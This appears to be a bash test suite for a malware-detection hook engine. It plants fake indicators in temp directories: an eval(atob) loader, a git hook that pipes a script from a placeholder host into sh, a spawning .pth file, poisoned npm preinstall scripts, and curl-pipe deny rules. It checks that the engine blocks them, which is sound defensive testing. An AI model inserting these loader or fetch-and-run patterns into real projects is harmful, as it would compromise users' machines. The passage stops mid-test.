#!/usr/bin/env bash
# tests/run.sh — fixtures test seam over the wormhook engine.
#
# The engine is a pure stdin->stdout transducer, so each case is {synthetic payload + planted
# files in a hermetic temp CWD} -> assert on the emitted JSON. The dogfood CI job only proves
# "no false positive on self"; this proves the engine DETECTS what it claims.
#
# Hermetic by construction: HOME and XDG_CACHE_HOME redirect into each case's mktemp dir, so a
# planted ~/.claude dropper or scan-cache marker can never touch the developer's real $HOME.
#
# Malware fixtures assemble from fragments at runtime, so no literal IOC string sits in this
# source — otherwise the harness would trip wormhook scanning its OWN tree.
#
# bash 3.2 / Apple /bin/bash safe: no associative arrays, no mapfile, no ${arr[@]} on
# a possibly-empty array under set -u. shellcheck-clean under the repo default floor.
#
# Run:   bash tests/run.sh           (or: tests/run.sh)
# Exit:  0 = all cases passed - 1 = one or more failed (CI gates on this).

set -uo pipefail

# Developer machines export engine/doctor knobs via settings.json "env" (e.g.
# WORMHOOK_QUARANTINE=1 flips the default-off case flag-on). Flag-on cases re-export.
unset WORMHOOK_QUARANTINE WORMHOOK_T2_TTL_HOURS WORMHOOK_DOCTOR_QUIET WORMHOOK_SIGAGE_MAX_DAYS
# shellcheck disable=SC2046  # word-splitting the name list is the point
unset $(compgen -v WORMHOOK_SKIP_ 2>/dev/null) 2>/dev/null || true

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ENGINE="$REPO_ROOT/scripts/wormhook.sh"
SCAN_CLI="$REPO_ROOT/scripts/wormhook-scan.sh"

command -v jq >/dev/null 2>&1 || { echo "tests: jq required" >&2; exit 1; }
[[ -r "$ENGINE" ]] || { echo "tests: engine not found ($ENGINE)" >&2; exit 1; }

# IOC fixture fragments, assembled so the literal signature never appears verbatim in
# this file (see header). _e = "eval", _a = "atob" -> "eval(atob(" only at runtime.
_e='ev'; _e="${_e}al"; _a='at'; _a="${_a}ob"
MAL_DECODE_EVAL="module.exports = ${_e}(${_a}(process.env.X));"
MAL_INJECT="const k = ${_a}(process.env.FAKE_KEY); ${_e}(k);"
MAL_DROPPER='setup'; MAL_DROPPER="${MAL_DROPPER}.mjs"   # agent-hijack dropper filename
_c='cu'; MAL_CURL_SH="${_c}rl -s http://evil.example/p.sh | sh"   # remote-exec git-hook body
_o='os.sys'; MAL_PTH="import os;${_o}tem('true')"                 # .pth spawn-on-start body

PASS=0 FAIL=0
# Track temp dirs so a mid-run failure (set -e is OFF) still cleans up via the trap.
TMP_DIRS=()
cleanup() { local d; for d in "${TMP_DIRS[@]:-}"; do [[ -n "$d" && -d "$d" ]] && rm -rf "$d"; done; }
trap cleanup EXIT

# Redirecting HOME and XDG_CACHE_HOME here keeps the Tier-0 persistence checks and the Tier-2
# scan cache off the developer's real machine.
_mktemp_case() {  # -> CASE_DIR / CASE_HOME / CASE_CACHE / CASE_CWD
  CASE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/wormhook-test.XXXXXX")"
  TMP_DIRS+=("$CASE_DIR")
  CASE_HOME="$CASE_DIR/home"; CASE_CACHE="$CASE_DIR/cache"; CASE_CWD="$CASE_DIR/cwd"
  mkdir -p "$CASE_HOME" "$CASE_CACHE" "$CASE_CWD"
}

_run_engine() {  # $1 = payload JSON -> the verdict JSON, from the UNCHANGED engine
  printf '%s' "$1" | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" bash "$ENGINE" 2>/dev/null
}

# Built the way Claude and the CLI build it: jq --arg, so a quoted path cannot break out.
_payload() {  # $1=event  $2=command (optional)
  local ev="$1" cmd="${2:-}"
  if [[ -n "$cmd" ]]; then
    jq -nc --arg c "$cmd" --arg w "$CASE_CWD" --arg e "$ev" \
      '{tool_input:{command:$c},cwd:$w,hook_event_name:$e}'
  else
    jq -nc --arg w "$CASE_CWD" --arg e "$ev" '{cwd:$w,hook_event_name:$e}'
  fi
}

# A FAIL never aborts the run (set -e is off), so one broken case cannot hide the others.
# The final exit code is what CI gates on.
_ok()  { PASS=$((PASS+1)); printf '  \033[0;32mPASS\033[0m  %s\n' "$1"; }
_bad() { FAIL=$((FAIL+1)); printf '  \033[1;31mFAIL\033[0m  %s\n' "$1"; [[ -n "${2:-}" ]] && printf '          %s\n' "$2"; }

# assert_jq NAME JSON FILTER — FILTER must evaluate truthy (jq -e). On failure dumps
# the offending value so a broken assertion is diagnosable from the CI log.
assert_jq() {
  local name="$1" json="$2" filter="$3"
  if printf '%s' "$json" | jq -e "$filter" >/dev/null 2>&1; then
    _ok "$name"
  else
    _bad "$name" "filter failed: $filter"
    printf '          got: %s\n' "$(printf '%s' "$json" | jq -c '{verdict,decision,hookSpecificOutput,systemMessage}' 2>/dev/null || printf '%s' "$json" | head -c 300)"
  fi
}

echo "wormhook fixtures harness"
echo "  engine: $ENGINE"
echo

# 1. PER-TIER POSITIVES — one planted IOC per tier produces the expected verdict.

# --- Tier 0: never cached, always runs. UPS blocks via a top-level decision.
_mktemp_case
mkdir -p "$CASE_HOME/.claude"
printf '// agent-hijack dropper payload\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
OUT="$(_run_engine "$(_payload UserPromptSubmit)")"
assert_jq "T0 persistence: HOME/.claude dropper blocks (UPS)" "$OUT" \
  '.decision=="block" and (.systemMessage|contains("AGENT-HIJACK PERSISTENCE"))'

# --- Tier 1: the PreToolUse install gate hard-denies an injected loader.
_mktemp_case
printf '%s\n' "$MAL_INJECT" > "$CASE_CWD/index.js"
OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
assert_jq "T1 project source: injected loader blocks (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS CODE IN PROJECT SOURCE FILE"))'

# --- Tier 2: an install-class PostToolUse forces the expensive walk; the name is proof.
_mktemp_case
mkdir -p "$CASE_CWD/node_modules/evil-pkg"
printf '{"name":"x"}' > "$CASE_CWD/package.json"
printf '/* shai-hulud payload */\n' > "$CASE_CWD/node_modules/evil-pkg/bun_environment.js"
OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "T2 node_modules: payload-file IOC -> red verdict (PostToolUse)" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("NPM SUPPLY-CHAIN MALWARE")))'

# --- Tier 2 behavioral: the higher-FP heuristic lives ONLY here, never in a block tier.
_mktemp_case
mkdir -p "$CASE_CWD/node_modules/lib"
printf '{"name":"x"}' > "$CASE_CWD/package.json"
printf '%s\n' "$MAL_DECODE_EVAL" > "$CASE_CWD/node_modules/lib/index.js"
OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "T2 node_modules: decode-then-eval behavioral content -> red" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("NPM SUPPLY-CHAIN MALWARE")))'

# 2. FALSE-POSITIVE REGRESSIONS — clean trees must stay green.

# --- v0.15.2 guard: @aws-sdk/core ships `api.cloud-aws.adc-e.uk` as a real partition
#     suffix, so that IOC must stay dropped.
_mktemp_case
mkdir -p "$CASE_CWD/node_modules/@aws-sdk/core"
printf '{"name":"x"}' > "$CASE_CWD/package.json"
cat > "$CASE_CWD/node_modules/@aws-sdk/core/partitions.json" <<'JSON'
{
  "partitions": [
    {
      "id": "aws-iso-e",
      "regionRegex": "^eu-isoe-\\w+-\\d+$",
      "outputs": {
        "dnsSuffix": "cloud.adc-e.uk",
        "dualStackDnsSuffix": "api.cloud-aws.adc-e.uk",
        "implicitGlobalRegion": "eu-isoe-west-1",
        "name": "aws-iso-e",
        "supportsDualStack": true,
        "supportsFIPS": true
      }
    }
  ]
}
JSON
# The partition table is also bundled inside an SDK .js module — scan both surfaces.
printf 'export const partitions={dualStackDnsSuffix:"api.cloud-aws.adc-e.uk"};\n' \
  > "$CASE_CWD/node_modules/@aws-sdk/core/partitions.js"
OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "FP guard: @aws-sdk partitions adc-e.uk stays green" "$OUT" \
  '.verdict=="green"'

# --- A clean source tree with ordinary code stays green (no INJECT_RE trip).
_mktemp_case
printf 'export const env = process.env;\nconsole.log("hello", JSON.parse("{}"));\n' > "$CASE_CWD/app.js"
OUT="$(_run_engine "$(_payload SessionStart)")"
assert_jq "FP guard: ordinary clean source stays green (SessionStart)" "$OUT" \
  '.verdict=="green"'

# --- A user DENY rule carrying a curl-pipe is security POLICY, not dropper wiring.
_mktemp_case
mkdir -p "$CASE_CWD/.claude"
cat > "$CASE_CWD/.claude/settings.json" <<'JSON'
{ "permissions": { "deny": ["Bash(curl * | bash*)", "Bash(curl * | sh*)"] } }
JSON
OUT="$(_run_engine "$(_payload UserPromptSubmit)")"
# UPS is silent-on-clean (no green line) -> empty output is the clean signal here.
assert_jq "FP guard: curl-pipe DENY policy does not self-flag (UPS clean)" "${OUT:-{}}" \
  '(.decision // "") != "block"'

# 3. EMISSION-SHAPE CONTRACT — PreToolUse nests permissionDecision; UPS puts decision
#    top-level and must NOT carry hookSpecificOutput.additionalContext.
_mktemp_case
printf '%s\n' "$MAL_INJECT" > "$CASE_CWD/loader.js"
PRE="$(_run_engine "$(_payload PreToolUse 'npm install')")"
UPS="$(_run_engine "$(_payload UserPromptSubmit)")"

assert_jq "shape: PreToolUse nests permissionDecision==deny" "$PRE" \
  '.hookSpecificOutput.permissionDecision=="deny" and (has("decision")|not)'
assert_jq "shape: UserPromptSubmit uses TOP-LEVEL decision==block" "$UPS" \
  '.decision=="block"'
assert_jq "shape: UserPromptSubmit emits NO hookSpecificOutput.additionalContext" "$UPS" \
  '(.hookSpecificOutput.additionalContext // null) == null'
# The two shapes are mutually distinct: the key carrying the block on one event is
# absent on the other.
assert_jq "shape: PreToolUse carries no top-level decision" "$PRE" '(.decision // null)==null'
assert_jq "shape: UserPromptSubmit carries no permissionDecision" "$UPS" \
  '(.hookSpecificOutput.permissionDecision // null)==null'

# 4. GIT-HOOK BODY NEVER SELF-FLAGS — driven through the ACTUAL installer, not a
#    re-synthesis, into an isolated HOME so it never touches the real git config.
if [[ -r "$SCAN_CLI" ]] && command -v git >/dev/null 2>&1; then
  _mktemp_case
  mkdir -p "$CASE_CWD/.git/hooks"
  # install-git-hook sets global core.hooksPath under $HOME and writes the marker block.
  HOME="$CASE_HOME" git config --global core.hooksPath "$CASE_DIR/global-hooks" >/dev/null 2>&1
  HOME="$CASE_HOME" bash "$SCAN_CLI" install-git-hook >/dev/null 2>&1
  HOOK="$CASE_DIR/global-hooks/post-merge"
  if [[ -f "$HOOK" ]]; then
    # SessionStart yields an explicit green verdict — a stronger "nothing flagged" signal
    # than UPS silent-clean.
    cp "$HOOK" "$CASE_CWD/.git/hooks/post-merge"
    OUT="$(_run_engine "$(_payload SessionStart)")"
    assert_jq "git-hook body does NOT self-flag (Tier-0, real installer body)" "$OUT" \
      '.verdict=="green"'
    # Belt-and-suspenders: the same clean body under a block event also never blocks.
    OUT2="$(_run_engine "$(_payload UserPromptSubmit)")"
    assert_jq "git-hook body does NOT self-flag under a block event (UPS)" "${OUT2:-{}}" \
      '(.decision // "") != "block"'
  else
    _bad "git-hook body never self-flags" "installer did not produce $HOOK"
  fi
else
  _bad "git-hook body never self-flags" "wormhook-scan.sh or git unavailable — cannot synthesize the real hook body"
fi

# 4b. INSTALL-CLI WRITES A VERSION-STABLE LAUNCHER — the LaunchAgents exec ~/.local/bin, so a
#     file that changes identity per release re-alerts macOS about a background item.
if [[ -r "$SCAN_CLI" ]]; then
  _mktemp_case
  BIN="$CASE_HOME/.local/bin/wormhook-scan"
  # XDG_CONFIG_HOME wins over $HOME when resolving the pointer, and a CI runner sets it — pin it
  # into the case or install-cli writes the pointer onto the real machine and the asserts read air.
  CASE_XDG="$CASE_HOME/.config"; PTR="$CASE_XDG/wormhook/install-path"
  _install() { HOME="$CASE_HOME" XDG_CONFIG_HOME="$CASE_XDG" bash "$1" install-cli >/dev/null 2>&1; }
  _install "$SCAN_CLI"

  if [[ -f "$BIN" && ! -L "$BIN" && -x "$BIN" ]]; then _ok "install-cli: writes an executable launcher, not a symlink"
  else _bad "install-cli: writes an executable launcher, not a symlink" "$BIN is missing, a symlink, or not executable"; fi

  cp "$BIN" "$CASE_DIR/launcher.1" 2>/dev/null
  _install "$SCAN_CLI"
  if cmp -s "$CASE_DIR/launcher.1" "$BIN"; then _ok "install-cli: re-run is byte-idempotent"
  else _bad "install-cli: re-run is byte-idempotent" "second run rewrote $BIN"; fi

  # THE REGRESSION: installing from a different (version-scoped) root must move the pointer
  # and leave the launcher untouched.
  mkdir -p "$CASE_DIR/v99"
  cp -R "$REPO_ROOT/scripts" "$CASE_DIR/v99/" 2>/dev/null
  _install "$CASE_DIR/v99/scripts/wormhook-scan.sh"
  if cmp -s "$CASE_DIR/launcher.1" "$BIN"; then _ok "install-cli: a version move leaves the launcher byte-identical"
  else _bad "install-cli: a version move leaves the launcher byte-identical" "a release would re-alert macOS"; fi
  # Compare physical paths: install-cli resolves through /var -> /private/var, and so must this.
  WANT="$(cd -P "$CASE_DIR/v99" && pwd)"
  GOT="$(cat "$PTR" 2>/dev/null)"
  if [[ "$GOT" == "$WANT" ]]; then _ok "install-cli: the pointer follows the new install root"
  else _bad "install-cli: the pointer follows the new install root" "want $WANT, got ${GOT:-<no pointer at $PTR>}"; fi

  # A legacy symlink must be REPLACED, never written through — cp onto one overwrites the
  # install it points at.
  SUM_BEFORE="$(shasum -a 256 "$SCAN_CLI" | cut -d' ' -f1)"
  ln -sf "$SCAN_CLI" "$BIN"
  _install "$SCAN_CLI"
  if [[ ! -L "$BIN" ]]; then _ok "install-cli: replaces a legacy symlink with the launcher"
  else _bad "install-cli: replaces a legacy symlink with the launcher" "$BIN is still a symlink"; fi
  if [[ "$(shasum -a 256 "$SCAN_CLI" | cut -d' ' -f1)" == "$SUM_BEFORE" ]]; then
    _ok "install-cli: never writes through a symlink onto the installed CLI"
  else _bad "install-cli: never writes through a symlink onto the installed CLI" "clobbered $SCAN_CLI"; fi

  # No XDG_CONFIG_HOME here on purpose: the pointer path is baked in absolute at install time,
  # so the launcher must resolve under launchd's bare environment. No manifest => pointer path.
  if HOME="$CASE_HOME" "$BIN" --help 2>/dev/null | grep -q 'wormhook-scan —'; then
    _ok "launcher: resolves the engine and runs"
  else _bad "launcher: resolves the engine and runs" "$BIN produced no help output"; fi

  command rm -f "$PTR"
  HOME="$CASE_HOME" "$BIN" --help >/dev/null 2>&1; RC=$?
  if [[ "$RC" -eq 2 ]]; then _ok "launcher: both resolvers dead -> degraded exit 2, never a false 0"
  else _bad "launcher: both resolvers dead -> degraded exit 2, never a false 0" "got rc $RC"; fi
else
  _bad "install-cli launcher" "wormhook-scan.sh unavailable"
fi

# 5. TIER-2 SCAN-CACHE — the key is blind to an in-place OVERWRITE of a dep file (#55),
#    since no dir mtime moves and no install ran. The marker TTL bounds that window.
_mktemp_case
mkdir -p "$CASE_CWD/node_modules/leftpad"
printf '{"name":"t","version":"1.0.0"}' > "$CASE_CWD/package.json"
printf '{"lockfileVersion":3,"packages":{}}' > "$CASE_CWD/package-lock.json"
printf 'module.exports=function(){return 1}\n' > "$CASE_CWD/node_modules/leftpad/index.js"
# Same derivation the engine uses: sha256 of the CWD string under XDG_CACHE_HOME.
MARKER_FILE="$CASE_CACHE/notambourine/malware-scan/$(printf '%s' "$CASE_CWD" | shasum -a 256 | awk '{print $1}')"

OUT="$(_run_engine "$(_payload PostToolUse 'npm install')")"
assert_jq "T2 cache: clean install-class walk stays green" "$OUT" '.verdict=="green"'
if [[ -f "$MARKER_FILE" ]]; then
  _ok "T2 cache: marker written after clean walk"
else
  _bad "T2 cache: marker written after clean walk" "missing $MARKER_FILE"
fi

OUT="$(_run_engine "$(_payload SessionStart)")"
assert_jq "T2 cache: fresh marker + unchanged key -> SessionStart reuses cache" "$OUT" \
  '.verdict=="green" and (.systemMessage|contains("cached, deps unchanged"))'

# Overwrite an existing dep file, then backdate the marker past its TTL: the next
# SessionStart must re-walk and go red.
printf '%s\n' "$MAL_DECODE_EVAL" > "$CASE_CWD/node_modules/leftpad/index.js"
touch -t 202001010000 "$MARKER_FILE" 2>/dev/null
OUT="$(_run_engine "$(_payload SessionStart)")"
assert_jq "T2 cache TTL: expired marker re-walks and catches in-place overwrite" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("NPM SUPPLY-CHAIN MALWARE")))'

# 6. COVERAGE-GAP REGRESSIONS (#58/#60) — a WORKTREE's hooks dir (.git is a FILE there),
#    plus $VIRTUAL_ENV and pip --user roots, not just the four conventional venv names.

# --- The main checkout's .git/hooks governs the worktree too, so a scan from the
#     worktree must still find a poisoned post-merge.
if command -v git >/dev/null 2>&1; then
  _mktemp_case
  git -C "$CASE_CWD" init -q &&
  git -C "$CASE_CWD" -c user.email=t@t.t -c user.name=t commit -q --allow-empty -m init &&
  git -C "$CASE_CWD" worktree add -q "$CASE_DIR/wt" >/dev/null 2>&1
  if [[ -d "$CASE_DIR/wt" ]]; then
    printf '#!/bin/sh\n%s\n' "$MAL_CURL_SH" > "$CASE_CWD/.git/hooks/post-merge"
    chmod +x "$CASE_CWD/.git/hooks/post-merge"
    CASE_CWD="$CASE_DIR/wt"   # scan FROM the worktree
    OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
    assert_jq "T0 git-hook: worktree resolves main repo hooks dir (PreToolUse deny)" "$OUT" \
      '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS GIT HOOK"))'
  else
    _bad "T0 git-hook: worktree resolves main repo hooks dir" "git worktree add failed"
  fi
else
  _bad "T0 git-hook: worktree resolves main repo hooks dir" "git unavailable"
fi

# --- An active venv under a non-conventional name is seeded from the env, not guessed.
_mktemp_case
mkdir -p "$CASE_CWD/venv312/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_CWD/venv312/lib/python3.12/site-packages/evil.pth"
OUT="$(printf '%s' "$(_payload PreToolUse 'python3 app.py')" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" VIRTUAL_ENV="$CASE_CWD/venv312" \
    bash "$ENGINE" 2>/dev/null)"
assert_jq "T0 .pth: \$VIRTUAL_ENV venv under a non-standard name denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'

# --- pip install --user: ~/.local/lib/pythonX.Y/site-packages is scanned via $HOME.
_mktemp_case
mkdir -p "$CASE_HOME/.local/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_HOME/.local/lib/python3.12/site-packages/evil.pth"
OUT="$(_run_engine "$(_payload PreToolUse 'python3 app.py')")"
assert_jq "T0 .pth: user site-packages (pip --user) denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'

# --- #58 remainder: a pyenv version's site-packages (no venv anywhere) is swept.
_mktemp_case
mkdir -p "$CASE_HOME/.pyenv/versions/3.12.0/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_HOME/.pyenv/versions/3.12.0/lib/python3.12/site-packages/evil.pth"
OUT="$(_run_engine "$(_payload PreToolUse 'python3 app.py')")"
assert_jq "#58 .pth: pyenv version site-packages denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'

# --- #58 remainder: macOS framework user site (~/Library/Python) is swept.
_mktemp_case
mkdir -p "$CASE_HOME/Library/Python/3.9/lib/python/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_HOME/Library/Python/3.9/lib/python/site-packages/evil.pth"
OUT="$(_run_engine "$(_payload PreToolUse 'pip install requests')")"
assert_jq "#58 .pth: ~/Library/Python user site denies (PreToolUse)" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS PYTHON .pth"))'

# 7. GATE DECOMPOSITION + TARGET DIR (#56/#57) — compound and env-prefixed commands must
#    gate, and Tier 1 must read the manifest the command operates on, not only $CWD.

# Poisoned install-lifecycle manifest, assembled from fragments (see header).
_poison_manifest() { jq -n --arg s "node $MAL_DROPPER" '{scripts:{preinstall:$s}}' > "$1"; }

# --- #56+#57: `cd sub && npm install` gates, and the deny comes from the SUB manifest.
_mktemp_case
mkdir -p "$CASE_CWD/sub"
printf '{"scripts":{}}' > "$CASE_CWD/package.json"
_poison_manifest "$CASE_CWD/sub/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'cd sub && npm install')")"
assert_jq "#56/#57: cd sub && npm install denies on the sub manifest" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

# --- #56: a leading VAR=value assignment no longer defeats the gate.
_mktemp_case
_poison_manifest "$CASE_CWD/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'CI=1 npm install')")"
assert_jq "#56: CI=1 npm install gates and denies" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

# --- #56: a gated verb AFTER a separator fires the PostToolUse re-scan.
_mktemp_case
printf '%s\n' "$MAL_INJECT" > "$CASE_CWD/index.js"
OUT="$(_run_engine "$(_payload PostToolUse 'git pull && npm test')")"
assert_jq "#56: git pull && npm test triggers the post-pull scan -> red" "$OUT" \
  '.verdict=="red" and (.findings|map(.title)|any(contains("MALICIOUS CODE IN PROJECT SOURCE FILE")))'

# --- #57: npm --prefix <dir> install reads <dir>'s manifest.
_mktemp_case
mkdir -p "$CASE_CWD/packages/api"
printf '{"scripts":{}}' > "$CASE_CWD/package.json"
_poison_manifest "$CASE_CWD/packages/api/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'npm --prefix packages/api install')")"
assert_jq "#57: npm --prefix packages/api install denies on that manifest" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

# --- #57: a root install runs every workspace's lifecycle, so a poisoned workspace
#     preinstall must deny a plain root `npm install`.
_mktemp_case
mkdir -p "$CASE_CWD/packages/evil"
jq -n '{workspaces:["packages/*"],scripts:{}}' > "$CASE_CWD/package.json"
_poison_manifest "$CASE_CWD/packages/evil/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'npm install')")"
assert_jq "#57 workspaces: poisoned workspace preinstall denies a root install" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

# --- #57: pnpm-workspace.yaml globs are walked too.
_mktemp_case
mkdir -p "$CASE_CWD/apps/evil"
printf '{"scripts":{}}' > "$CASE_CWD/package.json"
printf 'packages:\n  - "apps/*"\n' > "$CASE_CWD/pnpm-workspace.yaml"
_poison_manifest "$CASE_CWD/apps/evil/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'pnpm install')")"
assert_jq "#57 pnpm-workspace.yaml: poisoned workspace preinstall denies" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.hookSpecificOutput.permissionDecisionReason|contains("MALICIOUS LIFECYCLE"))'

# --- FP guard: a benign workspace preinstall stays green through the widened gate.
_mktemp_case
mkdir -p "$CASE_CWD/packages/app"
jq -n '{workspaces:["packages/*"],scripts:{}}' > "$CASE_CWD/package.json"
printf '{"scripts":{"preinstall":"node scripts/gen.js"}}' > "$CASE_CWD/packages/app/package.json"
OUT="$(_run_engine "$(_payload PreToolUse 'cd packages/app && CI=1 npm install')")"
assert_jq "FP guard: clean compound install in a workspace stays green" "$OUT" \
  '.verdict=="green"'

# 8. OPT-IN QUARANTINE (#59) — the flag renames + chmod 000 an EXACT-MATCH artifact.
#    Behavioral matches stay report-only, and unset the engine mutates nothing.

# Names come from the signature source of truth, never literal here, so the harness cannot
# trip a future content signature scanning its own tree.
# shellcheck source=../scripts/malware-patterns.sh disable=SC1091
. "$REPO_ROOT/scripts/malware-patterns.sh"

# --- Default off: a Tier-0 hit is reported but the artifact is untouched.
_mktemp_case
mkdir -p "$CASE_HOME/.claude"
printf '// dropper\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
OUT="$(_run_engine "$(_payload UserPromptSubmit)")"
assert_jq "quarantine default-off: hit still blocks" "$OUT" '.decision=="block"'
if [[ -f "$CASE_HOME/.claude/$MAL_DROPPER" ]]; then
  _ok "quarantine default-off: artifact left in place"
else
  _bad "quarantine default-off: artifact left in place" "file moved without the flag"
fi

# --- Flag on: the dropper is renamed, the block still fires, the body names the action.
_mktemp_case
mkdir -p "$CASE_HOME/.claude"
printf '// dropper\n' > "$CASE_HOME/.claude/$MAL_DROPPER"
OUT="$(printf '%s' "$(_payload UserPromptSubmit)" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: UPS still blocks and reports QUARANTINED" "$OUT" \
  '.decision=="block" and (.systemMessage|contains("QUARANTINED"))'
if [[ ! -e "$CASE_HOME/.claude/$MAL_DROPPER" ]] \
   && ls "$CASE_HOME/.claude/$MAL_DROPPER".wormhook-quarantined.* >/dev/null 2>&1; then
  _ok "quarantine: exact-match artifact renamed to *.wormhook-quarantined.*"
else
  _bad "quarantine: exact-match artifact renamed" "original still present or no quarantined copy"
fi
if [[ -s "$CASE_CACHE/notambourine/malware-scan/quarantine.log" ]]; then
  _ok "quarantine: action recorded in quarantine.log"
else
  _bad "quarantine: action recorded in quarantine.log" "log missing or empty"
fi

# --- A behavioral .pth match stays report-only even with the flag on: an unattended
#     rename demands exact-match confidence.
_mktemp_case
mkdir -p "$CASE_CWD/.venv/lib/python3.12/site-packages"
printf '%s\n' "$MAL_PTH" > "$CASE_CWD/.venv/lib/python3.12/site-packages/evil.pth"
OUT="$(printf '%s' "$(_payload PreToolUse 'python3 app.py')" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: behavioral .pth still denies" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny"'
if [[ -f "$CASE_CWD/.venv/lib/python3.12/site-packages/evil.pth" ]]; then
  _ok "quarantine: behavioral .pth left in place (report-only)"
else
  _bad "quarantine: behavioral .pth left in place" "behavioral match was moved"
fi

# --- A known-bad .pth NAME (exact IOC, benign content) IS quarantined with the flag on.
_mktemp_case
mkdir -p "$CASE_CWD/.venv/lib/python3.12/site-packages"
printf '# sys.path shim\n' > "$CASE_CWD/.venv/lib/python3.12/site-packages/$MALWARE_PTH_IOC_NAME"
OUT="$(printf '%s' "$(_payload PreToolUse 'python3 app.py')" \
  | HOME="$CASE_HOME" XDG_CACHE_HOME="$CASE_CACHE" WORMHOOK_QUARANTINE=1 bash "$ENGINE" 2>/dev/null)"
assert_jq "quarantine: known-bad .pth name denies + reports QUARANTINED" "$OUT" \
  '.hookSpecificOutput.permissionDecision=="deny" and (.systemMessage|contains("QUARANTINED"))'
if [[ ! -e "$CASE_CWD/.venv/lib/python3.12/site-packages/$MALWARE_PTH_IOC_NAME" ]]; then
  _ok "quarantine: known-bad .pth name renamed"
else
  _bad "quarantine: known-bad .pth name renamed" "exact-name IOC left in place"
fi

# 9. SELF-INTEGRITY DOCTOR LIGHT (#61) — a pristine copy says nothing; one appended line
#    flips the SAME check 🔴. Runs on a COPY, so the real tree is never touched.
_mktemp_case
cp -R "$REPO_ROOT/scripts" "$CASE_DIR/scripts"
OUT="$(bash "$CASE_DIR/scripts/doctor/integrity.sh" 2>/dev/null)"
if [[ -z "$OUT" ]]; then
  _ok "integrity: pristine copy is silent"
else
  _bad "integrity: pristine copy is silent" "emitted: $OUT"
fi
printf '\n# appended by test\n' >> "$CASE_DIR/scripts/wormhook.sh"
OUT="$(bash "$CASE_DIR/scripts/doctor/integrity.sh" 2>/dev/null)"
assert_jq "integrity: one appended line flips 🔴 and names wormhook.sh" "$OUT" \
  '(.systemMessage|contains("🔴") and contains("wormhook.sh")) and (.hookSpecificOutput.additionalContext|contains("SELF-INTEGRITY FAILURE"))'
mv "$CASE_DIR/scripts/integrity.sha256" "$CASE_DIR/scripts/integrity.sha256.gone"
OUT="$(bash "$CASE_DIR/scripts/doctor/integrity.sh" 2>/dev/null)"
assert_jq "integrity: missing manifest degrades 🟡 (fail open, loud)" "$OUT" \
  '.systemMessage|contains("🟡") and contains("manifest missing")'

# 10. VERSION-DRIFT DOCTOR LIGHT — it reads a plugins/cache/ layout no dev checkout has,
#     so it went dead for 16 releases unnoticed. Both install shapes are fixtures below.

# _mkplug <root> <version> [name]: a minimal installed plugin tree with the real check.
_mkplug() {
  mkdir -p "$1/.claude-plugin" "$1/scripts/doctor"
  cp "$REPO_ROOT/scripts/doctor/drift.sh" "$REPO_ROOT/scripts/doctor/_utils.sh" "$1/scripts/doctor/"
  printf '{"name":"%s","version":"%s"}\n' "${3:-wormhook}" "$2" > "$1/.claude-plugin/plugin.json"
}
_drift() { CLAUDE_PLUGIN_ROOT="$1" bash "$1/scripts/doctor/drift.sh" 2>/dev/null; }

# --- url-sourced row: the catalog clone holds no copy, so a newer cache sibling is the
#     only local evidence.
_mktemp_case
P="$CASE_DIR/.claude/plugins"
mkdir -p "$P/marketplaces/notambourine/.claude-plugin"
